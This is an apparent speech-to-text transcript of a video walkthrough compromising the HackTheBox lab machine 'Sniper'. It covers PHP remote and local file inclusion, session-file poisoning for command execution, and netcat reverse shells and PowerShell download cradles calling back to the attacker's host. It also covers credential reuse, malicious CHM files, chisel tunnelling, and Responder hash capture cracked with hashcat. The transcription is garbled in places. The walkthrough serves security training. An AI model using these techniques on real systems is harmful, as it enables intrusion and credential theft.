 what's going on YouTube this is Epps Ahmed when sniper and we're gonna do this box two different ways and each step is going to be very similar but can put a unique twist on each step to make it feel a hundred percent different the very first step is getting a shell in the box the first way is using a remote file inclusion to include a code off a SMB server the other way you can do it is through a trick with lfi local file inclusion to include a PHP session file that has been tainted then the second step is switching users the first way we'll do it is just doing PowerShell to invoke command as a different user and then the second way is will upload chisel to the server and for the windows remoting port back to us and use evil one RM and then finally to route the box there's a scheduled task as cuting CHM files the first way we'll use in a shain to create a malicious schm file to execute code and then the second way we'll manually craft a CHM file that includes a image off our server and use responder to steal the hash crackit and login that way so with all that being said let's just jump in as always we can begin with it and map so - SC for default scripts as V enumerate versions okay I'll put all formats but in the end map directory and call it sniper and then the IP address which is 10 10 10 151 can take some time to run so I've already ran it looking at the results we have a few ports open but before we go over them we should stood up a end map to do all ports and all ports is - B - and Oh a and map sniper - all ports and the IP address and then just let that go running while we do some other things because you should always have some type of recon going in the background the very first thing we see is HTTP on port 80 its banner tells us it's iis httpd version 10.04 even 2019 oddly enough Microsoft didn't increase the is version for 2019 the title page is sniper KO we have the standard I guess our PC ports 135 139 and we also have port 445 open so right away I'm just gonna try SMB client 1010 151 and we forgot the - L to list shares and we get access to nine so probably nothing right there so let's go take a look at the website so going to ten tenten 151 does reveal a page if we highlight over a link we can see it just goes to the anchor which means it's not going anywhere so we can check each one of these and the all services is going to slash blog / index.php and the user one is going to user index dot PHP so we got two different directories and we know this server is running PHP despite being is which is a little bit odd but before we go poking into them we can do a bunch of go Buster's so I'm gonna do go Buster dir for der mode - w-4 word list users share word list dirt Buster directory lists will do two three small because I'm gonna be starting three of these actually so I don't want to hammer the server too much I'm gonna specify five threads I think the default is 10 but again because we are doing multiple ger Buster's I'm lowering the number of threads - X this can be extension PHP and - you is going to be HTTP 10 10 10 151 slash I'm going to copy this so we can make it easier to run multiple and the very first one I'm just going to run is this do - OH go Buster - root dot out and then paste and we're going to do slash blog and - OH go Buster - blog dot out and you can guess third one is gonna be user and - OH go Buster - user dot out you could use a different tool that does like recursive directory scanning but you're gonna go into a lot of directories you don't need to like CSS JavaScript etc so I always like being a bit more targeted so with those running let's go take a look at what the pages were so the blog look this it's looking like it's all text that doesn't mean anything we can do control you to view the source and I'm just checking if I see like WordPress Joomla or something of that nature don't really see anything and the source that indicates that so let's go take a look at the links up top home goes back there language we have it going to blog - en dot PHP blog - es PHP and blog - French PHP RFR so it's a parameter it's got lang equals and we can change the language to various things so I generally think when I see like an argument plus an extension I go right off the bat to some type of LF I so I'm going to turn this on - burp suite and we're going to go make sure we are intercepting shift are to send this I'm going to do ctrl R to go to repeater ctrl shift are to switch to that tab click send take a look at the bytes 6040 and we can see what it looks like so I'm just going to do language equals please subscribe I'm gonna see what it looks like when something invalid is there and this shouldn't be like please subscribe anyone I serve that thing shouldn't do anything so we should see how it behaves the main thing I was looking at is like the HTTP code and then I glanced at the page and I see we get a sorry page not found and it's also 2 9 1 l so I think it's like 6040 and 29:10 are the things that we're looking for so far but we don't want it to be those two things so we can try including other things so we could try going to something else on this page if we go back to the source we can say hey let's try including blog CSS style dot CSS click send we get page not found but we're already in blog so I'm going to try taking this off and just try CSS style dot CSS and it looks like we're getting something because I'm looking at the bytes it's not like mm it's not 60/40 and down here it looks like we get a CSS file so we have included it we could also try like a PHP wrapper I think it's PHP : : is it filtered convert base64 encode resource is equal to index dot PHP I think my mnsure this is going to work on Windows we can try URL encoding that and then send it we don't get any base64 and I'm just going to Google real quick PHP wrapper filter base64 and let's see PHP filter convert base64 - encode is that what I have convert base64 - encode and we still get nothing so we can't do that and being able to do this would allow us to extract PHP source code if we try just having it call itself if this is executing code which it looks like it is we get an indefinite hang because this is really index dot PHP and we're trying to have index dot PHP load itself and then when it loads itself it's gonna load itself again and then again and then again and again and then just never finish or maybe it'll finish in a few minutes with some weird error message because it ran out of memory so we could try calling a different index script so dot dot slash click send and we're getting page not found so we go up one directory - blog click send page not found this is Windows so I'm gonna try back slashes and we get page not found so I'm thinking there's a possibility that like there's some bad characters and anything with two periods is a bad character this shouldn't want this should have worked if it wasn't because we just went up one directory then into the directory that we'd know because the URL and tried including itself again so let's try random windows files let's do slash windows system32 licensed RTF click send 63,000 bytes and we're getting a Windows license so we know that this is now definitely NL fi we could try including other things like I think there's a directory panther on attend dot XML well this work 29:10 not there is that unattended XML 29:10 answered directory sequel in Windows panther is it unattended cell maybe that flower doesn't exist I was trying to find a file that would indicate what version of Windows it is but I'm not exactly sure it's unintended XML so oh it doesn't exist and I'm not sure other files I'm sure there is one that you can pick and then find out what it is but we'll just move on let's try doing a remote file include so 10 10 14 - we'll call this H DB please subscribe txt so we're just trying to call back to our server and load the file please subscribe txt so I'm going to do NCL v NP 4 4 5 click send it's taking its sweet time and we get an SMB header so that's a good sign we do have the server now calling back to us so we could place a file but generally I always like again doing recon in the background so I consider password cracking recon I'm gonna run responder and see if we can get the server to cough up a nto MV to ash click send we don't get anything I'm gonna try T C P dump - aye its capital I think ton 0 maybe lower case I and we got do port 445 click send we see it coming to us we don't see responder giving us a hash and we verified SMB server is on so this should have worked if the server was vulnerable to that doesn't look like it is we could verify it by doing like SMB client 10 1014 - which is myself specify something and the password of please whatever disconnect I thought that would have worked but maybe not let's just move on because we did not get the hash so the next thing we want to do is try like an impact web server or SMB server so make to SMB let's go in this in packet SMB server - SMB to support and then the share name we'll call it HDB and the path of where we're at let's go in here and create the file do we capitalize it we did so please subscribe txt and we're just going to call this lfi test so now when we click send we see it connecting we see a bunch of error messages and we'll see if it actually loads that file looks like it stopped going down oh 29:10 page not found so at this point we could do a lot of troubleshooting with SMB server itself or we can just accept that sometimes like pen test tools are there for convenience and they're not the most well tested or stable things in the world and move on and that's what I'd really do is I want to know is this a problem within packet or is this just not SMB itself is this just not working in general so we're gonna go to the actual SMB server within Linux and this is Etsy Samba SMB Kampf and let's just grab something profiles so this is going to 193 to 199 I think that's six so hit 6yy to yank paste uncomment and won't lame this HDB the comment will be please support me on patreon the path I always like using a path as close to the root as I please so that would be sov SMB I don't want to go root heb box that sniper SMB because file missions can get wonky and things may just not work so that's why I'm doing one only two directories up guest okay we want yes browsable we don't want yes again create mask 600 sure okay and then CD SRV let's go into SMB and create the file please subscribe txt and then put LF I test here and then we can do systemctl start smbd there we go and when we go to run this we can go down and we do see LF i test so looks like everything is good if you run into troubles with this some good troubleshooting tips would be use SMB client so SMB client - capital l 10 10 14 to hit enter and if you see the directory that's good then also you can do we can delete this real quick and run SMB client 10 10 14 to slash HDB and then run dir and try to get the file so please subscribe and we see the size of nine if we exit pink at it and we can download it that way so that's some good troubleshooting tips that may help you go down the path it's always sucks trying to troubleshoot something that doesn't work by trying to exploit out where you won't have standard out on the remote end if you test it locally you have all the logging you can potentially want and you're good so hopefully that makes sense now we can make the text file let's see RC e dot PHP will be very obvious with this so create the PHP file system echo test I will do RC e test I think we do it this way again I'm just doing this as simple as possible each step of the way and then we'll get a shell through a complex method and just a little bit but always helps breaking things apart to make sure it works before you do anything so RC e test does work I screwed something up there that syntax is just god-awful sometimes it's hard to talk and type at the same time so we're going to do request please subscribe ok so now we should have a way to execute code so if we do and please subscribe is equal to Who am I click send NT authority I user so that is good we could also run like system in filth is another good one to always run and this will tell you information about potential patches bye hi I said patches highlighted processors well in 2019 standard and it doesn't show hot fixes right here maybe we don't have permission to see hot fixes or maybe none are installed so just something to keep in mind so with the shell where the things we want to do well we always want to get a reverse shell so I'm gonna do before I do that I hate working and get parameters I always like doing post because it's just a bit more reliable in terms of like encoding so I'm going to right-click change request method click send and see if we still see our user at the bottom we don't and that's probably because this index dot PHP is expecting Lang to be all I get so if we thought about the source code it's probably get instead a request here these parameters are get post or request however despite this being a post request PHP is wonky and we can or maybe the HTTP RFC is wonky but we can put the request up there and we can put earth down here and it should work so even though the code is saying get the variable and we're doing a post request as long as you put it where it get request should work it works so little handy tidbit now we can do PowerShell who am I to make sure we can run PowerShell commands and we can so let's try a reverse shell so IX new object net web client download string HTTP 10 10 14 - we'll call this please subscribe ps1 and that should be good let's highlight this control you to your L encode and then we got to build that would sell so let's go htb boxes sniper make third dub-dub-dub and then what we can do is CP user share the Shang shells invoke PowerShell TCP dot ps1 - what do we call this please subscribe ps1 so just copy this reverse format to the bottom of the script so it executes soon as we load the script and put the port information so 9001 and we heard 10 10 14 - and 10 10 14 - is my boxes IP address could do if config tun 0 you can see what yours is mine again 10 10 14 - so now Python 3 HTTP server 80 when we run this oh we forgot to get a shell and CoV NP 9001 click send nothing happens which is odd we could try like W get this is PowerShell supports W get so PowerShell plus W get we don't need that click send and it downloads it but it's not doing IX and the let's control Z a bit so I can highlight things and based on one experience I know antivirus or a msi anti-malware scanning interface doesn't flag this as malicious and because it never hits a box when we do this request I don't think this is going to be some type of anti virus I think it's more likely what PowerShell mode we're in so the first command I'm going to run is PowerShell plus is it execution context dot session state dot language mood I think that's it send do this and we'll see wind constrain language mode which limits a lot of our powershell abilities so I'm going to avoid running like anything that I deem uses like.net reflection which is that IX thing not IX itself that oh my god brain foot come on new object net dot web client so this is doesn't work in constraint mode you could try like system dot net dot web client doesn't work we could try to do something like W get to download this reverse shell to the disk or use PowerShell encoding to try to get around it but the script itself uses things that don't work in constraint mode to my knowledge yeah I don't think this works in constraint mode the system net sockets so let's just try with net cat so I'm going to locate NC exe and we're going to copy it from user share window resources binary NC dot exe and copy it here and the locate command isn't always up-to-date as you see it said the file existed here when it didn't you just have to run update DB or update DB before you run locate to update that database but now that we have net cat in this sov SMB let's try changing this to be 10 10 14 - HD b and c exe and then we want to connect to 10 10 14 - 9 thousand one and run the command powershell we could do CMD but despite being in constrain mode i still like being in power shell itself so try running this and we'll see a shell comes back so now we are enter your 30 I user on this box so we can go to CD / GCI if a gets out item you can also do dir there is a docks directory we can go into Doc's don't have mission so we can go into users see who is on the box administrator Chris and public we don't have permission to go into any of these except public we do probably but we could do GCI - curse we don't permission died on all three so we can to get into public to do anything so let's go back to where a web shell was which is I net pub dub-dub-dub root so CD I net Pub dub-dub-dub root see what's here we have index.php we can do g CI - recurse select i think it's full name I want there we go to list all the files and we go down the list of things that may seem interesting so the blog we don't really have too many PHP scripts I'm mainly interested in files in na n PHP so I did that to highlight them go down we got auth DB index login logout and registration with the weird backup so this user directory is super interesting so let's go into user GCI and then we can do GC auth dot PHP GC is get content and this is just saying if session is set go to long end up in procession is not set go to login dot PHP so that's included at the top of probably index.php so how that works is yeah so or is a command so we just did index dot PHP and I didn't include the file it actually put the contents of it but as soon as this file load index dot PHP it checks if you logged in if you're not logged in it directs you to login dot PHP and the rest of this code doesn't even get read or executed so we want to look at DB dot PHP next and let's see enter your host username I left password empty because I do not set pastor on localhost but there is a password so that is unique we can copy this and the user is sniper if we do net user we don't have a sniper user on this box and as being local on the box one thing a lot of tools don't run is a bunch of like just information so if we do net user Chris we get a lot of good information from him so password last set always good if I'm on an engagement and I see a password set like five years ago that's gonna be the passwords I try like password 2015 which may be like a default password from five years ago I'm probably not gonna try password 2020 on a password set five years ago because that just doesn't make sense and generally passwords that are super old may be more likely to be weak so having passed a last set is super handy especially when you look at this and see DB PHP was edited the same day that Chris changed his password so if we look at DB PHP that's April 11th 10:51 and approximately like five hours before that Chris set his path so it's definitely interesting and chris is also a member of remote management users which is PowerShell remoting so what we could try is do dir or not di yeah type DB dot PHP grab Chris's password but not grab grab snipers password and then go into crack map exec - you Chris - be put the password in we need do SMB 10-10-10 151 and see if this works I think it's IP then SMB crack map exec is super picky at where you place each argument so always keep that in mind and because we have a directory called SMB crack top execs not running so I guess for every argument you do it checks it there's a directory or a file if there is it tries to read it so make sure you don't have the directory SMB when you run crack map exec but we see sniper chris is passing that password so that is the password so let's go and try to invoke command as sniper so we can do pass is equal to convert to secure string and then paste the password crap I'm gonna add our L rap real quick do that command if you don't have our L rap it's an the apt repository but what you do left right up and down on a windows of our shell so let's send this again okay copy and you could have also done net user administrator and see when their password was set and we could have tried that as well but I digress so we wanted to xq command is chris so let's do pass is equal to that and then actually fast is equal to convert to secure string this as plain text - force I'm going to type it again just because we're in constraint mode I'm not a hundred percent positive this works looks like it does the next thing we want to do is cred is equal to new object system management automation PS credential Chris pass okay look at cred it is an object so this command did work so now we can do invoke command computer named sniper credential cred script block Who am I and we get error message so let's see a specified logon session does not exist possible calls username invalid Kerberos is used whatever check the authentication method so let's try changing this like this and when we ran crack map exec let's see is it in this session was it 301 Rhian crack map exact it said there we go hit it the using was sniper backslash chris so that's why I'm trying this I always do two backslashes out of habit because backslash is a weird to escape character you never know how things work but now when we try this now it works so that's how you need do the username so now we can this shell - is go to 4 + CL v NP 9001 will call this shell - Chris and the script block will be 10 10 14 - h DB NC exe 10 10 14 - nine thousand one and powershell there to show - Chris - am I and we're now sniper - Chris the Bucks is listening on I thought it was listening on when RM doesn't look like it is you can also upload a tool like chisel on this box and then do PowerShell remoting / localhost on your box essentially create a tunnel and expose the windows of moding port which is what port is it tcp 5 9 8 5 so if you ran chisel if you don't know which is Liz look at my red is video but if you ran chisel and for did port 5985 on this box back to your box you can connect to it through like evil win RM or something but this is fine and don't not do RL rap here I do not let's do that so now we are Chris so if we do GCI nothing in documents we can do GCI here and GCI - recurse i think there is let's see GC i only files let's see get tight let's see - includes dot star let's try this include I think there's a - type just like in Linux but we can look at all the files inside this directory there's user dot txt which is going to be the hash for the user there's also a instructions dot CHM so we can try copying this back to our server so let's go into downloads and then copy instructions dot CHM 210 1014 - HD b I think that's all we need access is denied so let's go oh we're not running impacted SMB server running Samba I was trying to go to a pain that had like impact at running so I could change it to allow write access so let's do the flag writable is equal to yes and then systemctl restart smbd kris copy it access to denied CD sov chmod 777 SMB I like to live dangerously and again this is why I normally would use impact its SMB server so these changes that I'm making on my box do not persist so I'm going to change this back to 755 because that is a super dangerous thing to do but we have now got instructions ehm would you file against it it's a ms windows HTML help data and from this part we probably should be on windows because i don't know of a good way to edit these files on linux or open them we could also go back there was a docs directory and there is no text so we can do GC no txt and it's telling us our PHP skills suck we should write some documentation I'm also going to copy this PHP for dummies trial to see what this is - 10 10 14 - HD be chmod let's go down copy change it back and for that one we can actually open it but before we switch to Windows so root HDB boxes oh no one sov SMB let's see PHP for dummies is this actually what it says it is do you do do do come on loading and it looks like it actually is so we can delete that because that's not too important and I guess the next step is going up your windows and take a look at this CHM file and also on windows will want to use in a shame because nishang does have if we go user include the Shang locate in the Shang I just went there user share in the Shang fine dot - I see hm does have a alt ehm function which will give us code execution but this is a PowerShell thing and it also wants a executable called HTML help workshop installed so when we also do this on windows so let's get our IP address of a box and then switch over to when go up here I have commando running here and then we just go to the share and we can copy the CH m file to a desktop it open it if we want to and we just see some text but we want to make this malicious so let's see do we have in a shame and stored in commando ah heck C : tools in the shame okay so we do so dir let's do where is the outs ehm that was in client and I can buy make this text bigger properties deck okay so we can run else ehm - eh that's just notepad it and of course the text isn't that big there we go so let's see does it give example outs ehm payload script payload encoded command payload URL is there a payload command option - payload so that's why what we want so else ehm - payload 10 10 14 - and HT b NC dot exe 10 10 14 - 9 thousand 1 e power shell so that should be good we need - h HC path and this is that HTML workshop so c colon program files x86 and we don't have it so let's go and google for this so go to Chrome search HTML help workshop download and install this I think one of my biggest pet peeves is when a website's like JavaScript changes where the pages like when I loaded this went to click download this banner showed up and changed where everything was I just I cannot stand that but install it already has it yeah okay well this directory exists now so paste that okay that's it oh I'll see HM did that create a side of command now client why is it not that's weird it's the function called out - the HM City backslash tools machine client client import module do we do that there we go okay that's what it wanted it's been a while and my brain is currently fried from talking for probably an hour else ehm let's go to desktop actually I don't see HM paste that dot dot CH Emma created so uh minimize minimize minimize minimize dot dot C hm oh we just try to execute code well after that actually just worked and we go back oh no a warning because this box isn't how to get to ten ten fourteen to 172 htb you have to go back to a box chmod 777 sov SMB copy go back let's take that out of the dangerous mode and we can go back to a shell - Chris and we do dir here we echo for large - no - txt and we do Note 2 dots ehm and do a dir C do these disappear eventually and disappear eventually generally when you do see TFS and something's supposed to happen to a file it does disappear and what we can also do & Co VMP - 9001 and copy per file htb the file is called dots ehm denied see SRV SMB chmod 777 copy it so the notes ehm file got deleted but note 2 dot txt did not so that is a good sign for this document directory of being the place where users delete things I guess you can say dir that got deleted but we did not get a shell so let's look at the script we're doing 10 1014 - HD BNC exe 9001 PowerShell so you would think this would work dir file is gone so what I'm going to do TCP dump - I ton 0 port 4 4 5 copy there just get deleted still here so I'm gonna see if this file goes away and when it goes away do we get any hits so at this point we've probably made a pretty complex file so what I'm going to do is make it less complex so sov SMB let's go back up our payload is simply going to be a ping so we're going to ping 10 10 14 to and we'll probably want to rename this to something else because I don't think we can overwrite it call this pingzhi HM which back stage mod 777 ping go back to the shell and copy pink dots ehm so if that payload option actually executes sping we should see it in this TCP dump so it exists then it's going to potentially get deleted and hopefully we see it yep there we go it's now pinging us and then I think windows defaults to four pings and then it probably dies so the Box did paying us I guess the next step we could do is copy netcat to this box or maybe do like CMD /c so the very first thing i want to do is the CM d /c thing so we can try CMD / c 10 10 14 - h CB netcat dot exe 10 - 14 - yeah so we'll call this one CMD CH m copy we have to chmod 7-7 CMD we could change the hold on five the option what is it Etsy Samba SMB the create mask to be 666 or something let's do that real quick so now all files created or chmod is 7 7 7 and we can just exit that terminal does not look like it worked so let's simplify it and copy netcat to this box so let's go users chris downloads and then copy 10 10 14 - h DB do have h DB ID oh ok HT b and c dot exe to here ok that file exists so c colon users chris downloads so payload C colon backslash users Chris downloads and CD xc10 1014 - a PowerShell ok create a doc and wouldn't be named this one to NZ copy Docs and CC hm does not look like that create mask took effect okay so hopefully this one works what am i running NC 10 1014 - 9001 epower she'll see : oh there we go I was just about to do it manually and now we're a sniper administrator we go users administrator whoops administrator desktop we could get root dot text so that is the box the first way we're going to show it we're gonna do this box again and try not to use our SMB server as much so let's exit out of everything and we'll do the Box again the different way and I haven't actually done this way yet so it could be a learning experience well I did it like five or six months ago but I didn't prepared to do it this way is why it's meant to say so go all the way back so we didn't lfi through or an RFI through this page we're still going to abuse this page but we can do an lfi instead and the server also supports ball guns so you could try like admin admin and try login you get username password incorrect you could throw it to sequel map not really get anything but if you do sign up we can do love the alternate dot ways hip sack and the password would do password register if we do login with if sack and password we get this portal is under construction well in PHP for Windows if we Google PHP windows I ass session path it is see : windows temp I believe right here so 10 10 10 151 go to our services do this LF I and we can do slashed windows slash temp slash and then our session so if we look at our cookies go into with storage cookies here's a session so SCSS underscore that we see where our PHP session is username if SEC so in this session we can actually encode stuff if we change what a username is so let's go logout signup and we can try email which is you a at b.com username PHP system get up sack like that super weird username see if this works register probably should look through burp to see that just said username a password is incorrect but let's look at what a session says here's where a session is based nothing so let's see how do we exploit this I guess we have to find out what the bad characters of your user login is so let's go back to login and analyze a login request so we'll do a two at b.com username lol password lol send to suite make sure intercept is on registers send it to repeater click go 3:02 found let's do a bunch of bad characters so this should not work throw to foul must try putting it at indifferent email still get it so we probably should I guess we can try logging in with this full shift you copy up to the d-10 bit sweet off or probably not to create a script to create accounts and attempt to login password was lol password incorrect so let's switch over to Python and create something so the very first thing we have to do is figure a way to generate something random I'm gonna import do I have secrets I do token hex we'll do 10 secret star token X okay I just want to make sure I have that library if you don't you can do pip3 install secrets but we find bad care by and we're going to import requests because it's gonna be what we use to login so URL login is equal to HTTP 10 10 10 151 user login dot PHP and then registration alright URL reg is equal to the same thing except this is registration dot PHP okay and then the characters we want to test is equal to alright I don't know if I hit them all so let's do this again my microphone is in the way of typing this it's where the issue comes from quotes ooh that's a tough one let's do Python 3 import string string dot punctuate is it symbols symbols punctuation that does it so input string and characters is equal to string dot punctuation and then for character and characters we need to print care let's make sure this works right on three fine bad care that looks good and we will do random is equal to [Music] secrets dot token hex ten we can import secrets okay this isn't the best way to do random I guess because we're only doing hex but I mean we're not really using random in a way that needs to be secure so data is equal to pip says email username and password so and submit so email is equal to and we're going to do random hat pls sub comm that looks fine username is equal to the character and then password we would do a and then submit like that if we print data that looks good so now the next thing we do is register account so R is equal to request dot post URL is equal to URL login data is equal to data and we can do yeah are we fine I'll zoom out sending it to burp suite but if we have issues we'll do it R is equal to request dot post actually the first step is register and then we got a login so let's intercept the login request so that's a register login is username password and submit so URL is equal to URL login and the data this time is going to be username password submit so we can get rid of email username password submit there we go and data is equal to data at this point we could also probably use W fuzz once we create all the accounts because we don't need to know that random email but print text actually well again you can just send this login request let's get a repeater HTTP history login send so we can say if incorrect so if incorrect is in our text two three four print the character so what this is going to do loop through all the characters create the account then attempt to login and if it fails to login it will print the character its requests mount request and we may want to send this to burp suite Oh No there we go we found one two three so far right now we may have used the quote in a username and that's a bad character - is a bad character don't know if we use - semicolon space is probably one I don't know if we did space in this I don't see a space here so it's one thing we're not counting for so let's do that real quick so go back to burp suite turn intercept off go back to Firefox user we got a logout register something that doesn't exist username space would do a space B password of a a B password of a we can login if we look at our session let's see let's go here not sure why we're not getting the cookie however username right look like it worked by the way I think we can probably work around this so single quote that use we have a single quote here we can probably do like a PHP execution with this I think let's try it registering with this because these carrots are question mark isn't and equal isn't equal should let us do this without a space I believe let's see this is the page I wanted I'll go sign up at be calm hey oh we need backticks there we go login paste a that logs in let us try including this session nothing let's delete a cookie and get a new cookie so what is he using name this there we go well again faced username and we have code execution right there so we found a way to do it without utilizing our SMB server now we're going to find a way to get PowerShell running or command running let's try PowerShell so now shell supports two ways we can't do - e and C for encryption because - is a bad character but POW shell does support slashes so we could do slash ENC so if we do echo who am i i convert t utf-16 little-endian because that's how powershell likes it base64 w 0 copy like this we can test it out in our Windows machine so let's go into a command prompt PowerShell slash ENC paste and it works like that so let's try it and registering a user so so go back here let's just close this tab let's delete or a PHP session signup email this is gang annoying with email so we can do is equal to backtick PowerShell slash ANC backtick like that let's copy this register and then log in grab a session cookie and paste our session cookie and we still get anti-authority user so now we have a way to run PowerShell through this so let's go and I think we have payload all the things on my box popped payload all the things fine dot grap Reg got - our I reg SV this is what I want so we want methodology and resources download and execute that's DLL Zell let's see reg SVR 32 reverse shell see you till MSHDA see yeah let's just do an SMB server I was thinking about this there's a lot of things that will probably go wrong such as being in that PowerShell constrained mode so if you want you can challenge yourself and try to do a wall bin to execute this but we're just going to do it the old-fashioned way of executing that cat on our web server actually let's do - let's try uploading netcat to the box and then executing it so make third dub-dub-dub let's copy sov SMB netcat Exe here so we got netcat so we can do echo double you get 10 10 14 - NC exe - capital o I think is for out file will call this please sub dot exe ok that should be fun Oh people I want to write it in the temp directory C : Windows tempo that has a big command hopefully the username doesn't have like a length limit copy that looks fine echo - n because it's a big thing I just want to on basics for it if we pipe it to xxd you can see it's in utf-16 little-endian because there's an all byte after everything so that looks good copy ok so now we create the user and hope there's no link like length limit that's preventing this question mark is equal to PowerShell and crypt this tactic like that partially you had the Python script do this let's delete the PHP session log in we logged in we have to start an sm o web server we want Python 3 HTTP server 80 and paste the new session we have downloaded netcat so now NCL VMP 9001 we can try executing it so let´s do echo should just pay attention weiss save that as please sub dot exe echo c colon windows temp please sub XC 1010 14 to nine thousand one he powershell ok I convert T utf-16 little-endian please 64 w0 this is even longer I think copy let's go logout sign no face junk username we got to do the PHP tag so that equals this there we go copy a is the password then delete we're listening sing : windows temp that looks good well again oh we have to take a value and paste it doesn't look like we got a shell we can try doing view source please sub D X C to see if it downloaded we get page not found so chances are this executable did not download so let's see the way I normally work around this it's number one it could be a permission issue maybe we can't write into sequel in Windows 10 however I think we can because that's where the session file stored so my guess will be that - Oh option is wrong on W get so let us change this IP - once I do 1610 I think 184 yep so we can copy this stir the server back up go back to a Windows box PowerShell encoded paste CD windows temp not found so if we go to powershell w get 172 1610 184 and c dot exe oh t dot exe 1 - t dot txt oh it's access denied w get - eh let's see let's just do t dot exe so it does exist so that - capital o looks like it does work so maybe we just can't write there let's go back and look at everything we did so C : windows temp please sub dot exe so let's see C colon backslash windows tab that should work should be there but it's not there so I guess let's just try everything again to make sure we didn't make an error or something so the very first thing we do is aw get so let's copy this and do 10 1014 to NC exe and we'll just call this please work exe and I'm not going to specify C : I'm just gonna do slash windows because maybe it doesn't like the : I'm also going to put this in quotes even though this shouldn't matter because we saw the Box hit or server already so let's just copy and now we have to create that PowerShell user on the registration so log out delete or a cookie create a new account and do something question mark at equals paste like that a copy this new string see we don't have a dub dub dub server running yet so let's do HTTP server there we go let's login and take a cookie paster cookie and this should have downloaded but it didn't so we screwed up something let's see w get 10 10 14 2 n c dot exe that is us - capital o wonder if we just let's try this again I should really start converting that Python script to do this for me because it's very possible my user error that I'm introducing by doing it manually and screwing things up so question mark and like that equals yep oh I probably didn't do / ENC let's try this a copy well again copy there we go we got a hit so we can now try please work dot exe D for a for on me you do not for for me that is great news so close out of that start our reverse shell back up and where is this so this will be please work exe and the way I think we just did magic so copy this logout delete so I know equals like this powershell /e and see like that copy register paste copy our session paste and we get a shell so we got a shell without using SMB whatsoever on this box so I guess the next thing to do let's use evil win RM because why not do I have chisel on this box let's just go download chisel so get off of birth and then chisel github okay let's see where's release there it is I want it for Linux and I want it for Windows probably 64-bit okay CP downloads what were the names chisel make the chisel MV stars if chisel what start out GZ different I'm used to when I download things there and zip format is that not hard gzip - D there we go chmod plus x chisel 1x amd64 and let's see does this have instruction page real quick chisel server port like that and chisel client so then we can do chisel server listen on port let's say 8000 and because we are the server and we want to open a port up we need to enable reverse if we wanted a port on the client to be enabled we don't need to open up reverse but since we're the server and the server is going to listen on a new port after listening on 8000 this is why if you confused watch the reddish video so now we're there let's copy chisel chisel windows amd64 to chisel exe stood up a web server and we can go into windows temp/w get HTTP 10 10 14 to choose old dot exe - capital o chisel dot exe and begin downloading the file how big is this file let's take a while seedy dub-dub-dub tu - HS shizzle 7.3 Meg's I mean it is using go and not let compressed so just that makes sense so now we do netstat dash a and LP netstat dash a NP a n there we go windows flags trip me up sometimes let's see we want port 5985 we could also do 3 3 or 6 and then access to my sequel database but let's just do this first actually ss Ln PT I'm going to try doing two on one line and see if that works because I don't know if it does so chiselled dot exe client and then we want to do 10 10 14 - port 8000 or 5985 1 27001 5985 so reverse so the port is opening up on the server we're gonna open up port 5985 and anything that we listen a hit on 5985 it's going to send it through chisel come out on this end which is windows and get directed to this port so that's what that means 1 2700 1 through 3 or 6 let's try this with two flags if I hit enter connect hey it didn't both awesome but we lost her shell so we're gonna call this tab tunnels and then open up a new tab do n CL v NP 9001 go back and hit this again to get a new shell because we need the password so the password was in user and if we look at DB PHP we can get the password so first I'm gonna do my ass well yeah MySQL - capital H I think one 27001 - you DB user - P o - D for database sniper - P I think it's IP user password database is how I think that connection command works - capital D let's see NC 127 0 0 1 3 3 or 6 that is my sequel that should work there's it lowercase H there we go lowercase H so here we could do show tables select star in users select star and users wait what tables in sniper new sniper select let's see okay select ID and users my sq select command man that is a big brain Freud if I'm forgetting this it's like the most as basic as you get from holy crap I can't believe I forgot that just goes to show never be scared to Google and we can look at all the users mainly bunches of things that we created a super user this is the default password we could see what this is and I think test at one calm is not us let's see hashes org I think was hurting the Python that made me think in and not from I don't know I think it's search not check oh my god that is a pain to read s v LM s er CAPTCHA no crap that's a bit better x3 VD xkd there's a password super password so that's the password for the super user and this doesn't really do anything if you wanted to you could login so let's go back to the website slash user I'll go and then paste super user super user paste the password stole the same exact thing but let's go eggs add a base go back here where is the password here it is so CD opt evil when RM and what was it - you Chris - P this - I 10 10 10 151 see if this works nope it's not 151 it's local host because we're using chisel establishing connection and there we go so here we go with evil win RM so what do we say the last step was oh the file so I guess we have to go back to Windows box and create a document than instead of executing code is just gonna have him try to pull a file off a share and we'll responder and crack the password so let's do that going back to our commando machine we can open up a notepad plus plus we have it open here file new and we just got to create a basic HTML page so body h1 please sub do the heading it doesn't matter image source is equal to 10 10 14 - h TB please sub dot jpg like that / body slash HTML there we go that should be fine file save as let's save this to the desktop all types and we'll call this [Music] index.html so now we open up that HTML workshop application program files HTML help workshop and file new project sure name of it test HTM where the file is located desktop like that file compile file sure cannot compile file new let's see this is a weird application let's start over file new project with does this do anything no it's better than the name of your project file desktop call this test order exist test two we want HTML files that's what we want finish ok file compile save all display cannot open test - what is this file yeah I can't open it because it doesn't exist properties security administrators I can write to this let's try save project save all files sure compile project file I don't know where that file 1 test 2 dot hhp is it in C colon backslash c users hips ik let's close this and go through it slowly file new project specify naming a project file where you'd like it to be created well I have been doing on desktop and hasn't like that so let's do C colon backslash test dot h HB okay include an HTML file now we can add a file from the desktop which is index.html ok compile project file is going to be at C colon cannot open it's not there right click run as administrator project let's do new folder temp C colon backslash temp test dot H HP ok hey it created it we have found that file that is good we are including index compile compiling compiled holy crap that was painful copy to the share have to make right access chmod 777 srvs mb try again let's put that back to 755 and let's see I guess we can copy at first and then disable say it was test so let's move test dot C hm route ACB boxes sniper dub-dub-dub and we'll call this responders ehm may we go think that is good look at tunnels we are still listening or I still have our HTTP server up so let's go back to Chris Docs this one can be exited we got to stop SMB and then we can do responder a ton zero can't listen ad that's fine we only want SMB so now we can do W get ten ten fourteen two and IVA win RM itself does have like file upload capability so if you use that but as well just you w get responded see hm - OH responder CHM dir it now exists TCP dump - I ton Z Oh don't need a debug it because we definitely got a hit so here we go administrators here we can copy this go here SSH to the Kraken which again just another box in my house I don't like cracking in a VM because VMs are slow it goes against the whole methodology of cracking so you could do on your host I just don't because I'm a drop frame since I'm recording and of course this box has a few GPUs that helps so V hashes slash sniper paste this I'm gonna do hash cat - - example hashes less I'm a search for ntlm because I think this is ntlm v - that's what it looks like 5,600 or yeah I think it's 5,600 let's try this dot slash hash cat - M 5,600 hashes sniper up - word list rocky oh let's see if this works hopefully it does initializing and there we go it cracked butterfly exclamation point pound one so if we get out of hash cat and we do crack map exact ten ten ten 151 SMB - you administrator - P that it'll now say this box has been poned there we go so we could at this point do PS exec you could also do Windows remoting again with evil win RM but for four or five was open - so might as well just do PS exact or WMI exact if you don't wanna drop binary and do administrator at 10 10 10 